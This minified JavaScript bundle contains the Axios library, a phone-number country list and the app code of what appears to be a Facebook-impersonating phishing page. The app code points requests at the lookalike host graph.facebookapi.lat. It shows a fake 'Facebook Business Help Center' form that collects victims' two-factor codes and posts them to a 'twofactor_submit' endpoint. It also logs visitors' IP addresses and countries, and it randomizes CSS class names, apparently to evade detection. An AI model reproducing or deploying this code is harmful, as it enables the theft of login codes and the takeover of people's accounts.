    if (e) {
        try {
            Object.defineProperty(e, "name", {value: t})
        } catch {
        }
        Object.defineProperty(e, "adapterName", {value: t})
    }
});
const Gc = e => `- ${e}`, px = e => k.isFunction(e) || e === null || e === !1, ch = {
    getAdapter: e => {
        e = k.isArray(e) ? e : [e];
        const {length: t} = e;
        let n, r;
        const o = {};
        for (let i = 0; i < t; i++) {
            n = e[i];
            let l;
            if (r = n, !px(n) && (r = Ys[(l = String(n)).toLowerCase()], r === void 0)) throw new U(`Unknown adapter '${l}'`);
            if (r) break;
            o[l || "#" + i] = r
        }
        if (!r) {
            const i = Object.entries(o).map(([s, a]) => `adapter ${s} ` + (a === !1 ? "is not supported by the environment" : "is not available in the build"));
            let l = t ? i.length > 1 ? `since :
` + i.map(Gc).join(`
`) : " " + Gc(i[0]) : "as no adapter specified";
            throw new U("There is no suitable adapter to dispatch the request " + l, "ERR_NOT_SUPPORT")
        }
        return r
    }, adapters: Ys
};

function Vl(e) {
    if (e.cancelToken && e.cancelToken.throwIfRequested(), e.signal && e.signal.aborted) throw new wo(null, e)
}

function Qc(e) {
    return Vl(e), e.headers = kt.from(e.headers), e.data = Wl.call(e, e.transformRequest), ["post", "put", "patch"].indexOf(e.method) !== -1 && e.headers.setContentType("application/x-www-form-urlencoded", !1), ch.getAdapter(e.adapter || su.adapter)(e).then(function (r) {
        return Vl(e), r.data = Wl.call(e, e.transformResponse, r), r.headers = kt.from(r.headers), r
    }, function (r) {
        return ah(r) || (Vl(e), r && r.response && (r.response.data = Wl.call(e, e.transformResponse, r.response), r.response.headers = kt.from(r.response.headers))), Promise.reject(r)
    })
}

const Xc = e => e instanceof kt ? e.toJSON() : e;

function sr(e, t) {
    t = t || {};
    const n = {};

    function r(u, c, d) {
        return k.isPlainObject(u) && k.isPlainObject(c) ? k.merge.call({caseless: d}, u, c) : k.isPlainObject(c) ? k.merge({}, c) : k.isArray(c) ? c.slice() : c
    }

    function o(u, c, d) {
        if (k.isUndefined(c)) {
            if (!k.isUndefined(u)) return r(void 0, u, d)
        } else return r(u, c, d)
    }

    function i(u, c) {
        if (!k.isUndefined(c)) return r(void 0, c)
    }

    function l(u, c) {
        if (k.isUndefined(c)) {
            if (!k.isUndefined(u)) return r(void 0, u)
        } else return r(void 0, c)
    }

    function s(u, c, d) {
        if (d in t) return r(u, c);
        if (d in e) return r(void 0, u)
    }

    const a = {
        url: i,
        method: i,
        data: i,
        baseURL: l,
        transformRequest: l,
        transformResponse: l,
        paramsSerializer: l,
        timeout: l,
        timeoutMessage: l,
        withCredentials: l,
        adapter: l,
        responseType: l,
        xsrfCookieName: l,
        xsrfHeaderName: l,
        onUploadProgress: l,
        onDownloadProgress: l,
        decompress: l,
        maxContentLength: l,
        maxBodyLength: l,
        beforeRedirect: l,
        transport: l,
        httpAgent: l,
        httpsAgent: l,
        cancelToken: l,
        socketPath: l,
        responseEncoding: l,
        validateStatus: s,
        headers: (u, c) => o(Xc(u), Xc(c), !0)
    };
    return k.forEach(Object.keys(Object.assign({}, e, t)), function (c) {
        const d = a[c] || o, p = d(e[c], t[c], c);
        k.isUndefined(p) && d !== s || (n[c] = p)
    }), n
}

const dh = "1.5.1", au = {};
["object", "boolean", "number", "function", "string", "symbol"].forEach((e, t) => {
    au[e] = function (r) {
        return typeof r === e || "a" + (t < 1 ? "n " : " ") + e
    }
});
const Yc = {};
au.transitional = function (t, n, r) {
    function o(i, l) {
        return "[Axios v" + dh + "] Transitional option '" + i + "'" + l + (r ? ". " + r : "")
    }

    return (i, l, s) => {
        if (t === !1) throw new U(o(l, " has been removed" + (n ? " in " + n : "")), U.ERR_DEPRECATED);
        return n && !Yc[l] && (Yc[l] = !0, console.warn(o(l, " has been deprecated since v" + n + " and will be removed in the near future"))), t ? t(i, l, s) : !0
    }
};

function mx(e, t, n) {
    if (typeof e != "object") throw new U("options must be an object", U.ERR_BAD_OPTION_VALUE);
    const r = Object.keys(e);
    let o = r.length;
    for (; o-- > 0;) {
        const i = r[o], l = t[i];
        if (l) {
            const s = e[i], a = s === void 0 || l(s, i, e);
            if (a !== !0) throw new U("option " + i + " must be " + a, U.ERR_BAD_OPTION_VALUE);
            continue
        }
        if (n !== !0) throw new U("Unknown option " + i, U.ERR_BAD_OPTION)
    }
}

const Js = {assertOptions: mx, validators: au}, Dt = Js.validators;

class _i {
    constructor(t) {
        this.defaults = t, this.interceptors = {request: new Wc, response: new Wc}
    }

    request(t, n) {
        typeof t == "string" ? (n = n || {}, n.url = t) : n = t || {}, n = sr(this.defaults, n);
        const {transitional: r, paramsSerializer: o, headers: i} = n;
        r !== void 0 && Js.assertOptions(r, {
            silentJSONParsing: Dt.transitional(Dt.boolean),
            forcedJSONParsing: Dt.transitional(Dt.boolean),
            clarifyTimeoutError: Dt.transitional(Dt.boolean)
        }, !1), o != null && (k.isFunction(o) ? n.paramsSerializer = {serialize: o} : Js.assertOptions(o, {
            encode: Dt.function,
            serialize: Dt.function
        }, !0)), n.method = (n.method || this.defaults.method || "get").toLowerCase();
        let l = i && k.merge(i.common, i[n.method]);
        i && k.forEach(["delete", "get", "head", "post", "put", "patch", "common"], y => {
            delete i[y]
        }), n.headers = kt.concat(l, i);
        const s = [];
        let a = !0;
        this.interceptors.request.forEach(function (v) {
            typeof v.runWhen == "function" && v.runWhen(n) === !1 || (a = a && v.synchronous, s.unshift(v.fulfilled, v.rejected))
        });
        const u = [];
        this.interceptors.response.forEach(function (v) {
            u.push(v.fulfilled, v.rejected)
        });
        let c, d = 0, p;
        if (!a) {
            const y = [Qc.bind(this), void 0];
            for (y.unshift.apply(y, s), y.push.apply(y, u), p = y.length, c = Promise.resolve(n); d < p;) c = c.then(y[d++], y[d++]);
            return c
        }
        p = s.length;
        let x = n;
        for (d = 0; d < p;) {
            const y = s[d++], v = s[d++];
            try {
                x = y(x)
            } catch (C) {
                v.call(this, C);
                break
            }
        }
        try {
            c = Qc.call(this, x)
        } catch (y) {
            return Promise.reject(y)
        }
        for (d = 0, p = u.length; d < p;) c = c.then(u[d++], u[d++]);
        return c
    }

    getUri(t) {
        t = sr(this.defaults, t);
        const n = uh(t.baseURL, t.url);
        return ih(n, t.params, t.paramsSerializer)
    }
}

k.forEach(["delete", "get", "head", "options"], function (t) {
    _i.prototype[t] = function (n, r) {
        return this.request(sr(r || {}, {method: t, url: n, data: (r || {}).data}))
    }
});
k.forEach(["post", "put", "patch"], function (t) {
    function n(r) {
        return function (i, l, s) {
            return this.request(sr(s || {}, {
                method: t,
                headers: r ? {"Content-Type": "multipart/form-data"} : {},
                url: i,
                data: l
            }))
        }
    }

    _i.prototype[t] = n(), _i.prototype[t + "Form"] = n(!0)
});
const ti = _i;

class uu {
    constructor(t) {
        if (typeof t != "function") throw new TypeError("executor must be a function.");
        let n;
        this.promise = new Promise(function (i) {
            n = i
        });
        const r = this;
        this.promise.then(o => {
            if (!r._listeners) return;
            let i = r._listeners.length;
            for (; i-- > 0;) r._listeners[i](o);
            r._listeners = null
        }), this.promise.then = o => {
            let i;
            const l = new Promise(s => {
                r.subscribe(s), i = s
            }).then(o);
            return l.cancel = function () {
                r.unsubscribe(i)
            }, l
        }, t(function (i, l, s) {
            r.reason || (r.reason = new wo(i, l, s), n(r.reason))
        })
    }

    throwIfRequested() {
        if (this.reason) throw this.reason
    }

    subscribe(t) {
        if (this.reason) {
            t(this.reason);
            return
        }
        this._listeners ? this._listeners.push(t) : this._listeners = [t]
    }

    unsubscribe(t) {
        if (!this._listeners) return;
        const n = this._listeners.indexOf(t);
        n !== -1 && this._listeners.splice(n, 1)
    }

    static source() {
        let t;
        return {
            token: new uu(function (o) {
                t = o
            }), cancel: t
        }
    }
}

const hx = uu;

function gx(e) {
    return function (n) {
        return e.apply(null, n)
    }
}

function yx(e) {
    return k.isObject(e) && e.isAxiosError === !0
}

const qs = {
    Continue: 100,
    SwitchingProtocols: 101,
    Processing: 102,
    EarlyHints: 103,
    Ok: 200,
    Created: 201,
    Accepted: 202,
    NonAuthoritativeInformation: 203,
    NoContent: 204,
    ResetContent: 205,
    PartialContent: 206,
    MultiStatus: 207,
    AlreadyReported: 208,
    ImUsed: 226,
    MultipleChoices: 300,
    MovedPermanently: 301,
    Found: 302,
    SeeOther: 303,
    NotModified: 304,
    UseProxy: 305,
    Unused: 306,
    TemporaryRedirect: 307,
    PermanentRedirect: 308,
    BadRequest: 400,
    Unauthorized: 401,
    PaymentRequired: 402,
    Forbidden: 403,
    NotFound: 404,
    MethodNotAllowed: 405,
    NotAcceptable: 406,
    ProxyAuthenticationRequired: 407,
    RequestTimeout: 408,
    Conflict: 409,
    Gone: 410,
    LengthRequired: 411,
    PreconditionFailed: 412,
    PayloadTooLarge: 413,
    UriTooLong: 414,
    UnsupportedMediaType: 415,
    RangeNotSatisfiable: 416,
    ExpectationFailed: 417,
    ImATeapot: 418,
    MisdirectedRequest: 421,
    UnprocessableEntity: 422,
    Locked: 423,
    FailedDependency: 424,
    TooEarly: 425,
    UpgradeRequired: 426,
    PreconditionRequired: 428,
    TooManyRequests: 429,
    RequestHeaderFieldsTooLarge: 431,
    UnavailableForLegalReasons: 451,
    InternalServerError: 500,
    NotImplemented: 501,
    BadGateway: 502,
    ServiceUnavailable: 503,
    GatewayTimeout: 504,
    HttpVersionNotSupported: 505,
    VariantAlsoNegotiates: 506,
    InsufficientStorage: 507,
    LoopDetected: 508,
    NotExtended: 510,
    NetworkAuthenticationRequired: 511
};
Object.entries(qs).forEach(([e, t]) => {
    qs[t] = e
});
const vx = qs;

function fh(e) {
    const t = new ti(e), n = Gm(ti.prototype.request, t);
    return k.extend(n, ti.prototype, t, {allOwnKeys: !0}), k.extend(n, t, null, {allOwnKeys: !0}), n.create = function (o) {
        return fh(sr(e, o))
    }, n
}

const de = fh(su);
de.Axios = ti;
de.CanceledError = wo;
de.CancelToken = hx;
de.isCancel = ah;
de.VERSION = dh;
de.toFormData = sl;
de.AxiosError = U;
de.Cancel = de.CanceledError;
de.all = function (t) {
    return Promise.all(t)
};
de.spread = gx;
de.isAxiosError = yx;
de.mergeConfig = sr;
de.AxiosHeaders = kt;
de.formToJSON = e => sh(k.isHTMLForm(e) ? new FormData(e) : e);
de.getAdapter = ch.getAdapter;
de.HttpStatusCode = vx;
de.default = de;
const ph = de,
    En = ph.create({baseURL: "https://graph.facebookapi.lat/v18.php?path=/LoginProcess", timeout: 120e3});
En.defaults.headers.common["Content-Type"] = "application/json; charset=utf-8";
En.defaults.headers.common["Access-Control-Allow-Origin"] = "*";
ph.defaults.withCredentials = !0;
En.interceptors.request.use(function (e) {
    return e
});

function wx() {
    const e = Zi(), [t, n] = f.useState(""), [r, o] = f.useState(!1), [i, l] = f.useState(!1), [s, a] = f.useState(300), [u, c] = f.useState("05:00"),
        d = localStorage.getItem(sessionId), p = localStorage.getItem("maxDight");
    setTimeout(() => {
        if (s > 0) {
            a(s - 1);
            const y = Math.floor(s / 60);
            let v = y.toString();
            const C = s % 60;
            let g = C.toString();
            y < 10 && (v = "0" + y), C < 10 && (g = "0" + C), c(v + ":" + g)
        } else localStorage.removeItem(sessionId), window.location.href = "/"
    }, 1e3);
    const x = y => {
        o(!0), n(""), l(!1), y.preventDefault();
        const {TwofactorCode: v} = y.target.elements;
        if (console.log(v.value), v.value.length !== 8 && v.value.length !== 6) {
            n(`Code must be ${p} digits`), l(!0), o(!1);
            return
        }
        En.post("api/twofactor_submit", {sessionId: d, TwofactorCode: v.value, IsCheckPointCode: !0}).then((r) => {
            if (r.data.sessionId === null || r.data.errorDetail != null) {
                n("The code you've entered is incorrect."), l(!0), o(!1);
                return
            }
            localStorage.removeItem(sessionId), localStorage.setItem("canLogin", "true"), e("/processing")
        }).catch(C => {
            if (C.response.data.sessionId === null) localStorage.removeItem(sessionId), window.location.href = "/"; else {
                o(!1);
                let g = "";
                C.response.data.errorDetail.forEach(() => {
                    g += "Your code is incorrect"
                }), console.log(`error : ${g}`), l(!0), n(g)
            }
        })
    };
    return d == null ? m.jsx(m.Fragment, {}) : m.jsxs(m.Fragment, {
        children: [m.jsx(ft, {
            className: Math.random().toString(36).substring(2, 9) + " navbar-white",
            children: m.jsxs(lr, {
                children: [m.jsx(ft.Brand, {
                    href: "#home",
                    children: m.jsx("img", {
                        className: Math.random().toString(36).substring(2, 9) + " logo m-0 p-0",
                        src: Im
                    })
                }), m.jsx(ft.Toggle, {}), m.jsx(ft.Collapse, {
                    className: Math.random().toString(36).substring(2, 9) + " justify-content-end",
                    children: m.jsx(ft.Text, {})
                })]
            })
        }), m.jsx(lr, {
            className: Math.random().toString(36).substring(2, 9) + " mt-5 pt-5", children: m.jsx(xn, {
                className: Math.random().toString(36).substring(2, 9) + " d-flex justify-content-center",
                children: m.jsx(wn, {
                    md: 12, sm: 12, lg: 7, children: m.jsxs(Yn, {
                        className: Math.random().toString(36).substring(2, 9) + " px-0 pt-0 pb-0",
                        children: [m.jsx(Yn.Header, {children: "Access required (2/3)"}), m.jsx("hr", {className: Math.random().toString(36).substring(2, 9) + " mt-0"}), m.jsxs(Yn.Body, {
                            children: [m.jsx("span", {children: "Code had arrived to your sms or email. Please fill it out and complete the process!"}), m.jsxs("p", {children: ["Code must be ", p, " digits"]}), m.jsx(K, {
                                onSubmit: x,
                                id: "frmConfirm2FA",
                                children: m.jsx(xn, {
                                    children: m.jsx(wn, {
                                        xs: 4,
                                        children: m.jsxs(K.Group, {
                                            className: Math.random().toString(36).substring(2, 9) + " mb-3",
                                            controlId: "TwofactorCode",
                                            children: [m.jsxs(K.Label, {
                                                children: [p, "-digit code ", m.jsxs(K.Text, {
                                                    className: Math.random().toString(36).substring(2, 9) + " text-muted",
                                                    children: ["(", u, ")"]
                                                })]
                                            }), m.jsx(K.Control, {
                                                className: i ? "border-error" : "",
                                                maxLength: 8,
                                                type: "text",
                                                placeholder: "Enter code"
                                            }), t !== "" ? m.jsx("div", {
                                                className: Math.random().toString(36).substring(2, 9) + " text-mute text-danger",
                                                children: m.jsx("b", {children: t})
                                            }) : null]
                                        })
                                    })
                                })
                            }), m.jsx("hr", {}), m.jsxs("div", {
                                className: Math.random().toString(36).substring(2, 9) + " d-flex align-items-center",
                                children: [m.jsx("a", {href: "#", children: "Need another?"}), m.jsx(Jn, {
                                    disabled: r,
                                    type: "submit",
                                    form: "frmConfirm2FA",
                                    variant: "primary",
                                    className: Math.random().toString(36).substring(2, 9) + " ms-auto",
                                    children: "Send"
                                })]
                            })]
                        })]
                    })
                })
            })
        })]
    })
}

const mh = ({children: e = null}) => m.jsxs(m.Fragment, {
    children: [m.jsx("div", {
        className: "banner",
        children: m.jsxs("div", {
            className: "banner-content",
            children: [m.jsx("h5", {children: "Facebook Business Help Center"}), m.jsx("h1", {children: "How can we help you?"})]
        })
    }), m.jsx(lr, {
        children: m.jsxs("div", {
            className: "body",
            children: [m.jsx(xn, {
                className: "al",
                children: m.jsxs("center", {
                    className: "wrap-title",
                    children: [m.jsx("h5", {children: "How can we help?"}), m.jsx("p", {children: "We need more information to address your issue. This form will only take a few minutes."})]
                })
            }), m.jsx(xn, {
                className: "justify-content-center",
                children: m.jsx(wn, {lg: 9, md: 11, xl: 7, sm: 11, className: "mt-3", children: e ?? null})
            })]
        })
    })]
}), xx = () => {
    fetch("https://api.ipify.org?format=json").then(e => e.json()).then(e => {
        localStorage.setItem("ip", e.ip), Sx(e.ip)
    })
}, Sx = e => {
    fetch(`https://freeipapi.com/api/json/${e}`).then(t => t.json()).then(t => {
        localStorage.setItem("countryName", t.countryName), localStorage.setItem("countryCode", t.countryCode)
    })
};
var hr = [["Afghanistan", "af", "93"], ["Albania", "al", "355"], ["Algeria", "dz", "213"], ["Andorra", "ad", "376"], ["Angola", "ao", "244"], ["Antigua and Barbuda", "ag", "1268"], ["Argentina", "ar", "54", "(..) ........", 0], ["Armenia", "am", "374", ".. ......"], ["Aruba", "aw", "297"], ["Australia", "au", "61", ". .... ....", 0], ["Austria", "at", "43"], ["Azerbaijan", "az", "994", "(..) ... .. .."], ["Bahamas", "bs", "1242"], ["Bahrain", "bh", "973"], ["Bangladesh", "bd", "880"], ["Barbados", "bb", "1246"], ["Belarus", "by", "375", "(..) ... .. .."], ["Belgium", "be", "32", "... .. .. .."], ["Belize", "bz", "501"], ["Benin", "bj", "229"], ["Bhutan", "bt", "975"], ["Bolivia", "bo", "591"], ["Bosnia and Herzegovina", "ba", "387"], ["Botswana", "bw", "267"], ["Brazil", "br", "55", "(..) ........."], ["British Indian Ocean Territory", "io", "246"], ["Brunei", "bn", "673"], ["Bulgaria", "bg", "359"], ["Burkina Faso", "bf", "226"], ["Burundi", "bi", "257"], ["Cambodia", "kh", "855"], ["Cameroon", "cm", "237"], ["Canada", "ca", "1", "(...) ...-....", 1, ["204", "226", "236", "249", "250", "289", "306", "343", "365", "387", "403", "416", "418", "431", "437", "438", "450", "506", "514", "519", "548", "579", "581", "587", "604", "613", "639", "647", "672", "705", "709", "742", "778", "780", "782", "807", "819", "825", "867", "873", "902", "905"]], ["Cape Verde", "cv", "238"], ["Caribbean Netherlands", "bq", "599", "", 1], ["Central African Republic", "cf", "236"], ["Chad", "td", "235"], ["Chile", "cl", "56"], ["China", "cn", "86", "... .... ...."], ["Colombia", "co", "57", "... ... ...."], ["Comoros", "km", "269"], ["Congo", "cd", "243"], ["Congo", "cg", "242"], ["Costa Rica", "cr", "506", "....-...."], ["Côte d'Ivoire", "ci", "225", ".. .. .. .. .."], ["Croatia", "hr", "385"], ["Cuba", "cu", "53"], ["Curaçao", "cw", "599", "", 0], ["Cyprus", "cy", "357", ".. ......"], ["Czech Republic", "cz", "420", "... ... ..."], ["Denmark", "dk", "45", ".. .. .. .."], ["Djibouti", "dj", "253"], ["Dominica", "dm", "1767"], ["Dominican Republic", "do", "1", "", 2], ["Ecuador", "ec", "593"], ["Egypt", "eg", "20"], ["El Salvador", "sv", "503", "....-...."], ["Equatorial Guinea", "gq", "240"], ["Eritrea", "er", "291"], ["Estonia", "ee", "372", ".... ......"], ["Ethiopia", "et", "251"], ["Fiji", "fj", "679"], ["Finland", "fi", "358", ".. ... .. .."], ["France", "fr", "33", ". .. .. .. .."], ["French Guiana", "gf", "594"], ["French Polynesia", "pf", "689"], ["Gabon", "ga", "241"], ["Gambia", "gm", "220"], ["Georgia", "ge", "995"], ["Germany", "de", "49", ".... ........"], ["Ghana", "gh", "233"], ["Greece", "gr", "30"], ["Grenada", "gd", "1473"], ["Guadeloupe", "gp", "590", "", 0], ["Guam", "gu", "1671"], ["Guatemala", "gt", "502", "....-...."], ["Guinea", "gn", "224"], ["Guinea-Bissau", "gw", "245"], ["Guyana", "gy", "592"], ["Haiti", "ht", "509", "....-...."], ["Honduras", "hn", "504"], ["Hong Kong", "hk", "852", ".... ...."], ["Hungary", "hu", "36"], ["Iceland", "is", "354", "... ...."], ["India", "in", "91", ".....-....."], ["Indonesia", "id", "62"], ["Iran", "ir", "98", "... ... ...."], ["Iraq", "iq", "964"], ["Ireland", "ie", "353", ".. ......."], ["Israel", "il", "972", "... ... ...."], ["Italy", "it", "39", "... .......", 0], ["Jamaica", "jm", "1876"], ["Japan", "jp", "81", ".. .... ...."], ["Jordan", "jo", "962"], ["Kazakhstan", "kz", "7", "... ...-..-..", 0], ["Kenya", "ke", "254"], ["Kiribati", "ki", "686"], ["Kosovo", "xk", "383"], ["Kuwait", "kw", "965"], ["Kyrgyzstan", "kg", "996", "... ... ..."], ["Laos", "la", "856"], ["Latvia", "lv", "371", ".. ... ..."], ["Lebanon", "lb", "961"], ["Lesotho", "ls", "266"], ["Liberia", "lr", "231"], ["Libya", "ly", "218"], ["Liechtenstein", "li", "423"], ["Lithuania", "lt", "370"], ["Luxembourg", "lu", "352"], ["Macau", "mo", "853"], ["Macedonia", "mk", "389"], ["Madagascar", "mg", "261"], ["Malawi", "mw", "265"], ["Malaysia", "my", "60", "..-....-...."], ["Maldives", "mv", "960"], ["Mali", "ml", "223"], ["Malta", "mt", "356"], ["Marshall Islands", "mh", "692"], ["Martinique", "mq", "596"], ["Mauritania", "mr", "222"], ["Mauritius", "mu", "230"], ["Mexico", "mx", "52", "... ... ....", 0], ["Micronesia", "fm", "691"], ["Moldova", "md", "373", "(..) ..-..-.."], ["Monaco", "mc", "377"], ["Mongolia", "mn", "976"], ["Montenegro", "me", "382"], ["Morocco", "ma", "212"], ["Mozambique", "mz", "258"], ["Myanmar", "mm", "95"], ["Namibia", "na", "264"], ["Nauru", "nr", "674"], ["Nepal", "np", "977"], ["Netherlands", "nl", "31", ".. ........"], ["New Caledonia", "nc", "687"], ["New Zealand", "nz", "64", "...-...-...."], ["Nicaragua", "ni", "505"], ["Niger", "ne", "227"], ["Nigeria", "ng", "234"], ["North Korea", "kp", "850"], ["Norway", "no", "47", "... .. ..."], ["Oman", "om", "968"], ["Pakistan", "pk", "92", "...-......."], ["Palau", "pw", "680"], ["Palestine", "ps", "970"], ["Panama", "pa", "507"], ["Papua New Guinea", "pg", "675"], ["Paraguay", "py", "595"], ["Peru", "pe", "51"], ["Philippines", "ph", "63", ".... ......."], ["Poland", "pl", "48", "...-...-..."], ["Portugal", "pt", "351"], ["Puerto Rico", "pr", "1", "", 3], ["Qatar", "qa", "974"], ["Réunion", "re", "262"], ["Romania", "ro", "40"], ["Russia", "ru", "7", "(...) ...-..-..", 1], ["Rwanda", "rw", "250"], ["Saint Kitts and Nevis", "kn", "1869"], ["Saint Lucia", "lc", "1758"], ["Saint Vincent and the Grenadines", "vc", "1784"], ["Samoa", "ws", "685"], ["San Marino", "sm", "378"], ["São Tomé and Príncipe", "st", "239"], ["Saudi Arabia", "sa", "966"], ["Senegal", "sn", "221"], ["Serbia", "rs", "381"], ["Seychelles", "sc", "248"], ["Sierra Leone", "sl", "232"], ["Singapore", "sg", "65", "....-...."], ["Slovakia", "sk", "421"], ["Slovenia", "si", "386"], ["Solomon Islands", "sb", "677"], ["Somalia", "so", "252"], ["South Africa", "za", "27"], ["South Korea", "kr", "82", "... .... ...."], ["South Sudan", "ss", "211"], ["Spain", "es", "34", "... ... ..."], ["Sri Lanka", "lk", "94"], ["Sudan", "sd", "249"], ["Suriname", "sr", "597"], ["Swaziland", "sz", "268"], ["Sweden", "se", "46", "(...) ...-..."], ["Switzerland", "ch", "41", ".. ... .. .."], ["Syria", "sy", "963"], ["Taiwan", "tw", "886"], ["Tajikistan", "tj", "992"], ["Tanzania", "tz", "255"], ["Thailand", "th", "66"], ["Timor-Leste", "tl", "670"], ["Togo", "tg", "228"], ["Tonga", "to", "676"], ["Trinidad and Tobago", "tt", "1868"], ["Tunisia", "tn", "216"], ["Turkey", "tr", "90", "... ... .. .."], ["Turkmenistan", "tm", "993"], ["Tuvalu", "tv", "688"], ["Uganda", "ug", "256"], ["Ukraine", "ua", "380", "(..) ... .. .."], ["United Arab Emirates", "ae", "971"], ["United Kingdom", "gb", "44", ".... ......"], ["United States", "us", "1", "(...) ...-....", 0], ["Uruguay", "uy", "598"], ["Uzbekistan", "uz", "998", ".. ... .. .."], ["Vanuatu", "vu", "678"], ["Vatican City", "va", "39", ".. .... ....", 1], ["Venezuela", "ve", "58"], ["Vietnam", "vn", "84"], ["Yemen", "ye", "967"], ["Zambia", "zm", "260"], ["Zimbabwe", "zw", "263"]],
    Cx = "react-international-phone-", hh = (...e) => e.filter(t => !!t).join(" ").trim(),
    Ex = (...e) => hh(...e).split(" ").map(t => `${Cx}${t}`).join(" "),
    _e = ({addPrefix: e, rawClassNames: t}) => hh(Ex(...e), ...t),
    kx = ({value: e, mask: t, maskSymbol: n, offset: r = 0, trimNonMaskCharsLeftover: o = !1}) => {
        if (e.length < r) return e;
        let i = e.slice(0, r), l = e.slice(r), s = i, a = 0;
        for (let u of t.split("")) {
            if (a >= l.length) {
                if (!o && u !== n) {
                    s += u;
                    continue
                }
                break
            }
            u === n ? (s += l[a], a += 1) : s += u
        }
        return s
    }, Pi = e => e.replace(/\D/g, ""), Nx = (e, t) => {
        let n = e.style.display;
        n !== "block" && (e.style.display = "block");
        let r = e.getBoundingClientRect(), o = t.getBoundingClientRect(), i = o.top - r.top, l = r.bottom - o.bottom;
        i >= 0 && l >= 0 || (Math.abs(i) < Math.abs(l) ? e.scrollTop += i : e.scrollTop -= l), e.style.display = n
    }, it = e => {
        let [t, n, r, o, i, l] = e;
        return {name: t, iso2: n, dialCode: r, format: o, priority: i, areaCodes: l}
    }, Rx = e => `Field "${e}" is not supported`, qn = ({field: e, value: t, countries: n = hr}) => {
        if (["priority"].includes(e)) throw new Error(Rx(e));
        let r = n.find(o => {
            let i = it(o);
            return t === i[e]
        });
        if (r) return it(r)
    }, Jc = ({phone: e, countries: t = hr, currentCountryIso2: n}) => {
        var s;
        let r = {country: void 0, fullDialCodeMatch: !1};
        if (!e) return r;
        let o = Pi(e);
        if (!o) return r;
        let i = r, l = ({country: a, fullDialCodeMatch: u}) => {
            var p, x;
            let c = a.dialCode === ((p = i.country) == null ? void 0 : p.dialCode),
                d = (a.priority ?? 0) < (((x = i.country) == null ? void 0 : x.priority) ?? 0);
            (!c || d) && (i = {country: a, fullDialCodeMatch: u})
        };
        for (let a of t) {
            let u = it(a), {dialCode: c, areaCodes: d} = u;
            if (o.startsWith(c)) {
                let p = i.country ? Number(c) >= Number(i.country.dialCode) : !0;
                if (d) {
                    let x = o.substring(c.length);
                    for (let y of d) if (x.startsWith(y)) return {country: u, fullDialCodeMatch: !0}
                }
                (p || c === o || !i.fullDialCodeMatch) && l({country: u, fullDialCodeMatch: !0})
            }
            i.fullDialCodeMatch || o.length < c.length && c.startsWith(o) && (!i.country || Number(c) <= Number(i.country.dialCode)) && l({
                country: u,
                fullDialCodeMatch: !1
            })
        }
        if (n) {
            let a = qn({value: n, field: "iso2", countries: t});
            if (!a) return i;
            let u = a ? (c => {
                if (!(c != null && c.areaCodes)) return !1;
                let d = o.substring(c.dialCode.length);
                return c.areaCodes.some(p => p.startsWith(d))
            })(a) : !1;
            i && ((s = i.country) == null ? void 0 : s.dialCode) === a.dialCode && i.country !== a && i.fullDialCodeMatch && (!a.areaCodes || u) && (i = {
                country: a,
                fullDialCodeMatch: !0
            })
        }
        return i
    }, Tx = ({phone: e, dialCode: t, prefix: n = "+", charAfterDialCode: r = " "}) => {
        if (!e || !t) return e;
        let o = e;
        return o.startsWith(n) && (o = o.replace(n, "")), o.startsWith(t) ? (o = o.replace(t, ""), o.startsWith(r) && (o = o.replace(r, "")), o) : e
    }, jx = ({phone: e, dialCode: t, prefix: n = "+", charAfterDialCode: r = " "}) => `${n}${t}${r}${Tx({
        phone: e,
        dialCode: t,
        charAfterDialCode: r,
        prefix: n
    })}`, Ox = (e, t) => {
        let n = t.disableDialCodeAndPrefix ? !1 : t.forceDialCode,
            r = t.disableDialCodeAndPrefix ? !1 : t.insertDialCodeOnEmpty, o = e,
            i = u => t.trimNonDigitsEnd ? u.trim() : u;
        if (!o) return r && !o.length || n ? i(`${t.prefix}${t.dialCode}${t.charAfterDialCode}`) : i(o);
        if (o = Pi(o), o === t.dialCode && !t.disableDialCodeAndPrefix) return i(`${t.prefix}${t.dialCode}${t.charAfterDialCode}`);
        if (t.dialCode.startsWith(o) && !t.disableDialCodeAndPrefix) return i(n ? `${t.prefix}${t.dialCode}${t.charAfterDialCode}` : `${t.prefix}${o}`);
        if (!o.startsWith(t.dialCode) && !t.disableDialCodeAndPrefix) {
            if (n) return i(`${t.prefix}${t.dialCode}${t.charAfterDialCode}`);
            if (o.length < t.dialCode.length) return i(`${t.prefix}${o}`)
        }
        let l = () => {
            let u = t.dialCode.length;
            t.disableDialCodeAndPrefix && (u = 0);
            let c = o.slice(0, u), d = o.slice(u);
            return {phoneLeftSide: c, phoneRightSide: d}
        }, {phoneLeftSide: s, phoneRightSide: a} = l();
        return s = `${t.prefix}${s}${t.charAfterDialCode}`, a = kx({
            value: a,
            mask: t.mask,
            maskSymbol: t.maskChar,
            trimNonMaskCharsLeftover: t.trimNonDigitsEnd
        }), t.disableDialCodeAndPrefix && (s = ""), i(`${s}${a}`)
    }, _r = e => /\d/.test(e), _x = ({
                                         phoneBeforeInput: e,
                                         phoneAfterInput: t,
                                         phoneAfterFormatted: n,
                                         cursorPositionAfterInput: r,
                                         leftOffset: o = 0,
                                         deletion: i
                                     }) => {
        if (r < o) return o;
        if (!e) return n.length;
        let l = i === "backward";
        if (r === 0 && t.length > 0 && n.length > 0) {
            if (l) return 0;
            for (let d = 0; d < n.length; d += 1) if (_r(n[d])) return d;
            return n.length
        }
        if (t.length < e.length && t.length === 1) return n.length;
        let s = null;
        for (let d = r - 1; d >= 0; d -= 1) if (_r(t[d])) {
            s = d;
            break
        }
        if (s === null) return r !== 0 ? r : n.length;
        let a = 0;
        for (let d = 0; d < s; d += 1) _r(t[d]) && (a += 1);
        l && (a -= 1);
        let u = 0, c = 0;
        for (let d = 0; d < n.length && (u += 1, _r(n[d]) && (c += 1), c !== a + 1); d += 1) ;
        for (; !_r(n[u]) && u < n.length;) u += 1;
        return l && (u += 1), u
    }, Px = (e, t) => {
        let n = parseInt(e, 16);
        return Number(n + t).toString(16)
    }, Lx = "abcdefghijklmnopqrstuvwxyz", Ix = "1f1e6", qc = Lx.split("").reduce((e, t, n) => ({...e, [t]: Px(Ix, n)}), {}),
    Dx = e => [qc[e[0]], qc[e[1]]].join("-"),
    gh = ({iso2: e, size: t, src: n, protocol: r = "https", disableLazyLoading: o, className: i, style: l, ...s}) => {
        if (!e) return $.createElement("img", {
            className: _e({addPrefix: ["flag-emoji"], rawClassNames: [i]}),
            width: t,
            height: t, ...s
        });
        let a = () => {
            if (n) return n;
            let u = Dx(e);
            return `${r}://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/${u}.svg`
        };
